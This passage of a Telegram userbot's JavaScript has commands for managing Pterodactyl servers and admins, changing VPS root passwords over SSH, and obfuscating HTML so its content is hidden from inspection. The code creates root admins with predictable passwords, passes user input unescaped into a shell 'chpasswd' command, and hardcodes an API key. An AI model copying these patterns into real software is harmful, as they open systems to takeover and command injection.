                        await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                        await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Server berhasil dibuat!\n\n🆔 ID: ${srv.id}\n📛 Nama: ${name}\n👤 User: ${username}\n🔑 Pass: ${password}\n📧 Email: ${email}\n💾 RAM: ${spec.mem || 'Unlimited'} MB\n🌐 Domain: ${domain}</blockquote>`, parseMode: "html", replyTo: msg.id });
                    } catch (e) {
                        await client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html" });
                    }
                    return;
                }
            }

            // .listsrv
            if (msg.text?.startsWith(`${prefix}listsrv`)) {
                if (!pteroConfig) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Config pterodactyl belum diatur!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const loading = await client.sendMessage(msg.chatId, { message: "<blockquote>📋 Mengambil daftar server...</blockquote>", parseMode: "html", replyTo: msg.id });
                    const res = await axios.get(`${pteroConfig.domain}/api/application/servers`, { headers: { Authorization: `Bearer ${pteroConfig.adminApiKey}`, Accept: "application/json" } });
                    const servers = res.data.data || [];
                    await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                    if (servers.length === 0) {
                        await client.sendMessage(msg.chatId, { message: "<blockquote>📭 Tidak ada server</blockquote>", parseMode: "html", replyTo: msg.id });
                        return;
                    }
                    let list = `<blockquote><b>DAFTAR SERVER</b>\n\nTotal: ${servers.length}\n\n`;
                    servers.slice(0, 20).forEach((s, i) => {
                        const a = s.attributes;
                        list += `${i + 1}. <b>${a.name}</b>\n   ID: <code>${a.id}</code> | RAM: ${a.limits?.memory || 0}MB\n\n`;
                    });
                    list += "</blockquote>";
                    await client.sendMessage(msg.chatId, { message: list, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .delsrv
            if (msg.text?.startsWith(`${prefix}delsrv`)) {
                if (!pteroConfig) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Config pterodactyl belum diatur!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const serverId = text.split(" ")[1]?.trim();
                if (!serverId || !/^\d+$/.test(serverId)) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: ${prefix}delsrv <ID></blockquote>`, parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    await axios.delete(`${pteroConfig.domain}/api/application/servers/${serverId}`, { headers: { Authorization: `Bearer ${pteroConfig.adminApiKey}`, Accept: "application/json" } });
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Server ${serverId} dihapus!</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .adp - Create admin panel
            if (msg.text?.startsWith(`${prefix}adp`)) {
                if (!pteroConfig) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Config pterodactyl belum diatur!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const args = text.split(" ").slice(1).join(" ").split(",").map(p => p.trim());
                if (args.length < 2) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: ${prefix}adp nama,target</blockquote>`, parseMode: "html", replyTo: msg.id });
                    return;
                }
                const [name, targetId] = args;
                const email = `${name}@suika.com`;
                const password = `${name}110`;
                try {
                    const { domain, adminApiKey } = pteroConfig;
                    await axios.post(`${domain}/api/application/users`, { email, username: name, first_name: name, last_name: name, password, language: "en", root_admin: true }, { headers: { Authorization: `Bearer ${adminApiKey}`, "Content-Type": "application/json", Accept: "application/json" } });
                    await client.sendMessage(targetId, { message: `<blockquote>✅ Admin Panel\n\nDomain: ${domain}\nEmail: ${email}\nPassword: ${password}</blockquote>`, parseMode: "html" });
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Admin panel dibuat untuk ${name}</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .listadp
            if (msg.text?.startsWith(`${prefix}listadp`)) {
                if (!pteroConfig) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Config pterodactyl belum diatur!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const res = await axios.get(`${pteroConfig.domain}/api/application/users`, { headers: { Authorization: `Bearer ${pteroConfig.adminApiKey}`, Accept: "application/json" } });
                    const admins = (res.data.data || []).filter(u => u.attributes.root_admin);
                    if (admins.length === 0) {
                        await client.sendMessage(msg.chatId, { message: "<blockquote>📭 Tidak ada admin panel</blockquote>", parseMode: "html", replyTo: msg.id });
                        return;
                    }
                    let list = `<blockquote><b>ADMIN PANEL</b>\n\nTotal: ${admins.length}\n\n`;
                    admins.forEach((a, i) => {
                        list += `${i + 1}. ${a.attributes.username} (ID: ${a.attributes.id})\n`;
                    });
                    list += "</blockquote>";
                    await client.sendMessage(msg.chatId, { message: list, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .deladp
            if (msg.text?.startsWith(`${prefix}deladp`)) {
                if (!pteroConfig) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Config pterodactyl belum diatur!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const userId = text.split(" ")[1]?.trim();
                if (!userId) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: ${prefix}deladp <ID></blockquote>`, parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    await axios.delete(`${pteroConfig.domain}/api/application/users/${userId}`, { headers: { Authorization: `Bearer ${pteroConfig.adminApiKey}`, Accept: "application/json" } });
                    await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Admin ${userId} dihapus!</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // === VPS COMMANDS ===
            // .cekvps
            if (msg.text?.startsWith(`${prefix}cekvps`)) {
                const args = text.split(" ").slice(1);
                if (args.length < 2) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: ${prefix}cekvps <ip> <password></blockquote>`, parseMode: "html", replyTo: msg.id });
                    return;
                }
                const [ip, password] = args;
                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
                if (!ipRegex.test(ip)) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Format IP tidak valid!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const loading = await client.sendMessage(msg.chatId, { message: `<blockquote>🔍 Mengecek VPS ${ip}...</blockquote>`, parseMode: "html", replyTo: msg.id });
                try {
                    const { Client } = require('ssh2');
                    const conn = new Client();
                    conn.on('ready', async () => {
                        const execCmd = (cmd) => new Promise((resolve, reject) => {
                            conn.exec(cmd, (err, stream) => {
                                if (err) return reject(err);
                                let data = '';
                                stream.on('data', (chunk) => data += chunk.toString());
                                stream.on('close', () => resolve(data.trim()));
                            });
                        });
                        const ram = await execCmd("free -h | grep Mem | awk '{print $2}'");
                        const usedRam = await execCmd("free -h | grep Mem | awk '{print $3}'");
                        const cores = await execCmd("nproc");
                        const uptime = await execCmd("uptime -p");
                        const distro = await execCmd("cat /etc/os-release | grep PRETTY_NAME | cut -d'=' -f2 | tr -d '\"'");
                        conn.end();
                        await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                        await client.sendMessage(msg.chatId, { message: `<blockquote>🖥️ <b>VPS ${ip}</b>\n\n📦 Distro: ${distro}\n💾 RAM: ${usedRam}/${ram}\n⚡ Cores: ${cores}\n⏱️ Uptime: ${uptime.replace('up ', '')}</blockquote>`, parseMode: "html", replyTo: msg.id });
                    });
                    conn.on('error', async (err) => {
                        await client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Error: ${err.message}</blockquote>`, parseMode: "html" });
                    });
                    conn.connect({ host: ip, port: 22, username: 'root', password, readyTimeout: 15000 });
                } catch (e) {
                    await client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html" });
                }
                return;
            }

            // .pass
            if (msg.text?.startsWith(`${prefix}pass`)) {
                const args = text.split(" ").slice(1);
                if (args.length < 3) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format: ${prefix}pass <ip> <pass_lama> <pass_baru></blockquote>`, parseMode: "html", replyTo: msg.id });
                    return;
                }
                const [ip, passOld, passNew] = args;
                const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
                if (!ipRegex.test(ip)) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Format IP tidak valid!</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const loading = await client.sendMessage(msg.chatId, { message: `<blockquote>🔄 Mengubah password VPS ${ip}...</blockquote>`, parseMode: "html", replyTo: msg.id });
                try {
                    const { Client } = require('ssh2');
                    const conn = new Client();
                    conn.on('ready', () => {
                        const cmd = `echo "root:${passNew}" | chpasswd`;
                        conn.exec(cmd, { pty: true }, (err, stream) => {
                            if (err) {
                                conn.end();
                                client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Error: ${err.message}</blockquote>`, parseMode: "html" });
                                return;
                            }
                            stream.on('close', (code) => {
                                conn.end();
                                client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                                if (code === 0) {
                                    client.sendMessage(msg.chatId, { message: `<blockquote>✅ Password VPS berhasil diubah!\n\n🌐 IP: ${ip}\n🔑 Password baru: ${passNew}</blockquote>`, parseMode: "html", replyTo: msg.id });
                                } else {
                                    client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal ubah password (code: ${code})</blockquote>`, parseMode: "html", replyTo: msg.id });
                                }
                            });
                        });
                    });
                    conn.on('error', async (err) => {
                        await client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Error: ${err.message}</blockquote>`, parseMode: "html" });
                    });
                    conn.connect({ host: ip, port: 22, username: 'root', password: passOld, readyTimeout: 20000 });
                } catch (e) {
                    await client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html" });
                }
                return;
            }

            // === TOOLS COMMANDS ===
            // .ssweb
            if (msg.text?.startsWith(`${prefix}ssweb`)) {
                const url = text.split(" ").slice(1).join(" ");
                if (!url) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .ssweb <url></blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const loading = await client.sendMessage(msg.chatId, { message: "<blockquote>📸 Mengambil screenshot...</blockquote>", parseMode: "html", replyTo: msg.id });
                    const apiUrl = `https://api.screenshotmachine.com/?key=4a66a8&url=${encodeURIComponent(url)}&dimension=1920x1080`;
                    await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                    await client.sendFile(msg.chatId, { file: apiUrl, caption: `<blockquote>📸 Screenshot: ${url}</blockquote>`, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Error: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .q - Quotly
            if (msg.text?.startsWith(`${prefix}q`)) {
  (async () => {
    try {
      const botUsername = "QuotLyBot";
      const chatId = msg.chatId;
      
      const replyMsg = msg.replyTo ? await msg.getReplyMessage() : null;
      
      const textInput = msg.text.split(" ").slice(1).join(" ").trim();

      if (!replyMsg && !textInput) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Balas pesan atau ketik teks untuk dijadikan stiker</blockquote>",
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const lastMsgs = await client.getMessages(botUsername, { limit: 1 });
      const lastBefore = lastMsgs[0]?.id || 0;

      if (replyMsg?.id) {
        await client.forwardMessages(botUsername, {
          messages: [replyMsg.id],
          fromPeer: chatId,
        });
      } else if (textInput) {
        await client.sendMessage(botUsername, { message: textInput });
      }

      const waitMsg = await client.sendMessage(chatId, {
        message: "<blockquote>🚀 Otw membuat stiker... tunggu sebentar!</blockquote>",
        parseMode: "html",
        replyTo: msg.id,
      });

      let stickerMsg = null;
      const startTime = Date.now();

      while (Date.now() - startTime < 25000) {
        const msgs = await client.getMessages(botUsername, { limit: 5 });
        
        for (const msg of msgs) {
          if (
            msg.id > lastBefore &&
            msg.media?.document?.mimeType?.includes("image/webp")
          ) {
            stickerMsg = msg;
            break;
          }
        }
        
        if (stickerMsg) break;
        await new Promise((r) => setTimeout(r, 1500));
      }

      try {
        await client.deleteMessages(chatId, [waitMsg.id], { revoke: true });
      } catch {}

      if (!stickerMsg) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ Gagal mengambil hasil dari stiker</blockquote>",
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      await client.sendFile(chatId, {
        file: stickerMsg.media,
        replyTo: msg.id,
      });

      try {
        await client.deleteMessages(botUsername, [stickerMsg.id]);
      } catch {}

    } catch (e) {
      console.error("Error in .q command:", e);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan: ${e.message}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
    }
  })();
  return;
}
            
        // .invishtml
            if (msg.text?.startsWith(`${prefix}invishtml`)) {
  (async () => {
    const fs = require("fs");
    const path = require("path");
    const JsConfuser = require("js-confuser");

    const getStrongObfuscationConfig = () => {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.15,
    deadCode: 0.02,
    dispatcher: true,
    duplicateLiteralsRemoval: 0.25,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "zeroWidth",
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.10,
    renameVariables: true,
    renameGlobals: true,
    stringConcealing: true,
    stringCompression: 0.10,
    stringEncoding: 0.10,
    stringSplitting: 0.15,
    rgf: false,
  };
};

    function extractEmojis(text) {
      const emojiRegex = /([\u231A-\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u2702\u2708\u2709\u270F\u2712\u2714\u2716\u2728\u2733\u2734\u2744\u2747\u2753-\u2755\u2764\u2795-\u2797\u27A1\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u1F004\u1F0CF\u1F170-\u1F171\u1F17E-\u1F17F\u1F18E\u1F191-\u1F19A\u1F1E6-\u1F1FF\u1F201\u1F21A\u1F22F\u1F232-\u1F236\u1F238-\u1F23A\u1F250-\u1F251\u1F300-\u1F32C\u1F32D-\u1F335\u1F336-\u1F37C\u1F380-\u1F393\u1F3A0-\u1F3C4\u1F3C5-\u1F3D3\u1F3E0-\u1F3F0\u1F400-\u1F4FD\u1F4FF-\u1F53D\u1F54B-\u1F54E\u1F550-\u1F567\u1F57A\u1F595\u1F596\u1F5A4\u1F5FB-\u1F640\u1F645-\u1F64F\u1F680-\u1F6C5\u1F6CC\u1F6D0\u1F6D1-\u1F6D2\u1F6EB-\u1F6EC\u1F910-\u1F93E\u1F940-\u1F970\u1F973-\u1F976\u1F97A\u1F97C-\u1F9A2\u1F9BC-\u1F9C2\u1F9D0-\u1F9FF])/g;
      const emojis = [];
      const replaced = text.replace(emojiRegex, (m) => {
        const idx = emojis.length;
        emojis.push(m);
        return `%%EMO${idx}%%`;
      });
      return { payload: replaced, emojis };
    }

    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌️ Bales file .html dengan .invishtml</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      if (!repliedId) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal menentukan file yang direply</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>⌛ Sedang obfuscate file HTML dengan teknik invisible...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      let msgs;
      try {
        msgs = await client.getMessages(chatId, { ids: repliedId });
      } catch (e) {
        try {
          msgs = await client.getMessages(chatId, { ids: repliedId });
        } catch {
          msgs = null;
        }
      }
      
      const repliedMsg = Array.isArray(msgs) ? msgs[0] : msgs;

      if (!repliedMsg) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal ambil file yang direply</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName =
        repliedMsg.document?.attributes?.find(a => a.fileName)?.fileName ||
        repliedMsg.file?.name ||
        repliedMsg.document?.fileName ||
        "file.html";

      if (!fileName.toLowerCase().endsWith(".html")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ File yang direply harus .html</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      let buffer;
      try {
        buffer = await client.downloadMedia(repliedMsg.media || repliedMsg);
      } catch (err) {
        console.error("downloadMedia error:", err);
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal download file: ${String(err?.message || err)}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      if (!buffer || buffer.length === 0) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ File kosong setelah diunduh</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const content = buffer.toString("utf8");
      const { payload, emojis } = extractEmojis(content);
      const b64 = Buffer.from(payload, "utf8").toString("base64");

      const plainWrapperScript = `(function(){
  const EMOJIS = ${JSON.stringify(emojis)};
  const B64 = "${b64}";
  function decodeBase64(s){
    try { return decodeURIComponent(escape(window.atob(s))); } catch(e) { return window.atob(s); }
  }
  var decoded = decodeBase64(B64);
  decoded = decoded.replace(/%%EMO(\\d+)%%/g, function(_,n){ return EMOJIS[Number(n)] || ""; });
  document.open();
  document.write(decoded);
  document.close();
})();`;

      let obfuscatedCode;
      try {
        const obfResult = await JsConfuser.obfuscate(plainWrapperScript, getStrongObfuscationConfig());
        obfuscatedCode = typeof obfResult === "string" ? obfResult : (obfResult?.code ? obfResult.code : String(obfResult));
      } catch (e) {
        console.error("Obfuscation failed:", e);
        obfuscatedCode = plainWrapperScript;
      }

      const wrapperHtml = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Obfuscated HTML (Invisible) © ʙʏ ᴅᴏʏᴀɴɢ</title>
</head>
<body>
<script>
${obfuscatedCode}
</script>
<!-- Obfuscated with invisible technique © ʙʏ ᴅᴏʏᴀɴɢ -->
</body>
</html>`;

      const outName = fileName.replace(/\.html$/i, "") + "-invisible-obfuscated.html";
      const tmpPath = path.join(process.cwd(), outName);
      fs.writeFileSync(tmpPath, wrapperHtml, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ File berhasil di Obfuscate dengan teknik invisible:\n<b>${outName}</b>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { 
        fs.unlinkSync(tmpPath); 
      } catch (e) {
        console.warn("Gagal hapus file sementara:", e);
      }

    } catch (err) {
      console.error("encinvishtml error:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}
      
      // .encinvishtml
      if (msg.text?.startsWith(`${prefix}encinvishtml`)) {
  (async () => {
    
    const getStrongObfuscationConfig = () => {
      return {
        target: "node",
        calculator: true,
        compact: true,
        hexadecimalNumbers: true,
        controlFlowFlattening: 0.75,
        deadCode: 0.2,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        flatten: true,
        globalConcealing: true,
        identifierGenerator: "zeroWidth",
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: 0.75,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false,
      };
    };

    function extractEmojis(text) {
      const emojiRegex = /([\u231A-\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u2702\u2708\u2709\u270F\u2712\u2714\u2716\u2728\u2733\u2734\u2744\u2747\u2753-\u2755\u2764\u2795-\u2797\u27A1\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u1F004\u1F0CF\u1F170-\u1F171\u1F17E-\u1F17F\u1F18E\u1F191-\u1F19A\u1F1E6-\u1F1FF\u1F201\u1F21A\u1F22F\u1F232-\u1F236\u1F238-\u1F23A\u1F250-\u1F251\u1F300-\u1F32C\u1F32D-\u1F335\u1F336-\u1F37C\u1F380-\u1F393\u1F3A0-\u1F3C4\u1F3C5-\u1F3D3\u1F3E0-\u1F3F0\u1F400-\u1F4FD\u1F4FF-\u1F53D\u1F54B-\u1F54E\u1F550-\u1F567\u1F57A\u1F595\u1F596\u1F5A4\u1F5FB-\u1F640\u1F645-\u1F64F\u1F680-\u1F6C5\u1F6CC\u1F6D0\u1F6D1-\u1F6D2\u1F6EB-\u1F6EC\u1F910-\u1F93E\u1F940-\u1F970\u1F973-\u1F976\u1F97A\u1F97C-\u1F9A2\u1F9BC-\u1F9C2\u1F9D0-\u1F9FF])/g;
      const emojis = [];
      const replaced = text.replace(emojiRegex, (m) => {
        const idx = emojis.length;
        emojis.push(m);
        return `%%EMO${idx}%%`;
      });
      return { payload: replaced, emojis };
    }

    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌️ Bales file .html dengan .encinvishtml</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      if (!repliedId) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal menentukan file yang direply</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>⌛ Sedang obfuscate file HTML dengan teknik invisible...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      let msgs;
      try {
        msgs = await client.getMessages(chatId, { ids: repliedId });
      } catch (e) {
        try {
          msgs = await client.getMessages(chatId, { ids: repliedId });
        } catch {
          msgs = null;
        }
      }
      
      const repliedMsg = Array.isArray(msgs) ? msgs[0] : msgs;

      if (!repliedMsg) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal ambil file yang direply</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const fileName =
        repliedMsg.document?.attributes?.find(a => a.fileName)?.fileName ||
        repliedMsg.file?.name ||
        repliedMsg.document?.fileName ||
        "file.html";

      if (!fileName.toLowerCase().endsWith(".html")) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ File yang direply harus .html</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      let buffer;
      try {
        buffer = await client.downloadMedia(repliedMsg.media || repliedMsg);
      } catch (err) {
        console.error("downloadMedia error:", err);
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal download file: ${String(err?.message || err)}</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      if (!buffer || buffer.length === 0) {
        await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(() => {});
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ File kosong setelah diunduh</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const content = buffer.toString("utf8");
      const { payload, emojis } = extractEmojis(content);
      const b64 = Buffer.from(payload, "utf8").toString("base64");

      const plainWrapperScript = `(function(){
  const EMOJIS = ${JSON.stringify(emojis)};
  const B64 = "${b64}";
  function decodeBase64(s){
    try { return decodeURIComponent(escape(window.atob(s))); } catch(e) { return window.atob(s); }
  }
  var decoded = decodeBase64(B64);
  decoded = decoded.replace(/%%EMO(\\d+)%%/g, function(_,n){ return EMOJIS[Number(n)] || ""; });
  document.open();
  document.write(decoded);
  document.close();
})();`;

      let obfuscatedCode;
      try {
        const obfResult = await JsConfuser.obfuscate(plainWrapperScript, getStrongObfuscationConfig());
        obfuscatedCode = typeof obfResult === "string" ? obfResult : (obfResult?.code ? obfResult.code : String(obfResult));
      } catch (e) {
        console.error("Obfuscation failed:", e);
        obfuscatedCode = plainWrapperScript;
      }

      const wrapperHtml = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Obfuscated HTML (Invisible) © ʙʏ ᴅᴏʏᴀɴɢ</title>
</head>
<body>
<script>
${obfuscatedCode}
</script>
<!-- Obfuscated with invisible technique © ʙʏ ᴅᴏʏᴀɴɢ -->
</body>
</html>`;

      const outName = fileName.replace(/\.html$/i, "") + "-invisible-obfuscated.html";
      const tmpPath = path.join(process.cwd(), outName);
      fs.writeFileSync(tmpPath, wrapperHtml, "utf8");

      await client.deleteMessages(chatId, [loading.id], { revoke: true }).catch(()=>{});

      await client.sendFile(chatId, {
        file: tmpPath,
        filename: outName,
        caption: `<blockquote>✅ File berhasil di Obfuscate dengan teknik invisible:\n<b>${outName}</b>\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      try { 
        fs.unlinkSync(tmpPath); 
      } catch (e) {
        console.warn("Gagal hapus file sementara:", e);
      }

    } catch (err) {
      console.error("encinvishtml error:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan: ${String(err?.message || err)}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      }).catch(() => {});
    }
  })();
  return;
}
      
      // .enchtml
      if (msg.text?.startsWith(`${prefix}enchtml`)) {
  (async () => {
    const fs = require("fs");
    const path = require("path");

    function extractEmojis(text) {
      const emojiRegex = /([\u231A-\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u2702\u2708\u2709\u270F\u2712\u2714\u2716\u2728\u2733\u2734\u2744\u2747\u2753-\u2755\u2764\u2795-\u2797\u27A1\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u1F004\u1F0CF\u1F170-\u1F171\u1F17E-\u1F17F\u1F18E\u1F191-\u1F19A\u1F1E6-\u1F1FF\u1F201\u1F21A\u1F22F\u1F232-\u1F236\u1F238-\u1F23A\u1F250-\u1F251\u1F300-\u1F32C\u1F32D-\u1F335\u1F336-\u1F37C\u1F380-\u1F393\u1F3A0-\u1F3C4\u1F3C5-\u1F3D3\u1F3E0-\u1F3F0\u1F400-\u1F4FD\u1F4FF-\u1F53D\u1F54B-\u1F54E\u1F550-\u1F567\u1F57A\u1F595\u1F596\u1F5A4\u1F5FB-\u1F640\u1F645-\u1F64F\u1F680-\u1F6C5\u1F6CC\u1F6D0\u1F6D1-\u1F6D2\u1F6EB-\u1F6EC\u1F910-\u1F93E\u1F940-\u1F970\u1F973-\u1F976\u1F97A\u1F97C-\u1F9A2\u1F9BC-\u1F9C2\u1F9D0-\u1F9FF])/g;
      const emojis = [];
      const replaced = text.replace(emojiRegex, (m) => {
        const idx = emojis.length;
        emojis.push(m);
        return `%%EMO${idx}%%`;
      });
      return { payload: replaced, emojis };
    }

    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌️ Bales file .html dengan .enchtml</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id;
      if (!repliedId) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ Gagal menentukan file yang direply</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
        return;
      }

      const loading = await client.sendMessage(chatId, {
        message: `<blockquote>⌛ Sedang obfuscate file HTML...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      let msgs;
      try {
        msgs = await client.getMessages(chatId, { ids: repliedId });
      } catch (e) {
        try {
